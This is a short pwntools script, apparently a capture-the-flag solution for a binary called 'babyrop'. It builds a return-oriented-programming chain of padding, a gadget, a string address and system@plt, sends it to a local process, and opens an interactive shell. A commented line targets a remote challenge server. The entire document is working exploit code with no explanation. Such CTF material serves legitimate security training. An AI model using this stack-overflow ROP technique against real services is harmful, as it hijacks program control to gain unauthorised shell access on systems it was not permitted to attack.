from pwn import *

babyrop = ELF('./babyrop')

payload = p64(0x0000000000400486) * 8 + \
    p64(0x0000000000400683) + \
    p64(0x004006a4) + \
    p64(babyrop.plt['system'])

r = process('./babyrop')
# r = remote('challs1.nusgreyhats.org', 5012)

#r.recvuntil("My favorite shell is")
r.sendline(payload)
r.interactive()
